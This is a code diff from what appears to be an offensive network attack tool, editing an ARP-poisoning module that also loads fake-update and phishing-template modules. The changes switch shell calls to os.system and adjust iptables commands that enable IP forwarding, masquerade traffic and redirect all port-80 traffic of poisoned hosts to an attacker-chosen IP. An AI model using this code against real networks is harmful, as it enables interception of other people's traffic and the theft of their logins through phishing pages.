@@ -20,7 +20,7 @@ from Core.Settings import frm_Settings
 from Modules.ModuleUpdateFake import frm_update_attack
 from Modules.ModuleTemplates import frm_template
 from Modules.utils import ProcessThread,Refactor,ThreadScan
-from os import popen,chdir,getcwd,getuid,devnull
+from os import popen,chdir,getcwd,getuid,devnull,system
 from scapy.all import *
 import threading
 from urllib2 import urlopen,URLError
@@ -83,11 +83,13 @@ class frm_Arp_Poison(QWidget):
             if reply == QMessageBox.Yes:
                 event.accept()
                 if getuid() == 0:
-                    for i in self.ThreadDirc['Arp_posion']:
-                        i.stop(),i.join()
-                    for i in threadloading['template']:
-                        i.stop(),i.join()
-                        threadloading['template'] = []
+                    try:
+                        for i in self.ThreadDirc['Arp_posion']:
+                            i.stop(),i.join()
+                        for i in threadloading['template']:
+                            i.stop(),i.join()
+                            threadloading['template'] = []
+                    except:pass
                     self.deleteLater()
                 else:
                     pass
@@ -260,7 +262,9 @@ class frm_Arp_Poison(QWidget):
         for i in threadloading['template']:
             i.stop(),i.join()
             threadloading['template'] = []
-        self.Ftemplates.killThread()
+        try:
+            self.Ftemplates.killThread()
+        except:pass
         chdir(self.owd)
         self.StatusMonitor(False,'stas_arp')
         self.StatusMonitor(False,'stas_phishing')
@@ -303,18 +307,21 @@ class frm_Arp_Poison(QWidget):
             self.ip = self.txt_redirect.text()
             if len(self.ip) != 0:
                 iptables = [
-                        'iptables -t nat --flush','iptables --zero',
-                        'echo \'1\' > /proc/sys/net/ipv4/ip_forward',
+                        'iptables -t nat --flush',
+                        'iptables --zero',
+                        'echo  1 > /proc/sys/net/ipv4/ip_forward',
                         'iptables -A FORWARD --in-interface '+self.interfaces['gateway']+' -j ACCEPT',
                         'iptables -t nat --append POSTROUTING --out-interface ' +self.interfaces['activated'] +' -j MASQUERADE',
                         'iptables -t nat -A PREROUTING -p tcp --dport 80 --jump DNAT --to-destination '+self.ip
                             ]
-                for i in iptables: popen(i)
+                for i in iptables:
+                    try:system(i)
+                    except:pass
             else:
                 QMessageBox.information(self,'Error Redirect IP','Redirect IP not found')
         else:
             nano = [
-                'echo \'0\' > /proc/sys/net/ipv4/ip_forward','iptables --flush',
+                'echo 0 > /proc/sys/net/ipv4/ip_forward','iptables --flush',
                 'iptables --table nat --flush' ,\
                 'iptables --delete-chain', 'iptables --table nat --delete-chain'
                     ]
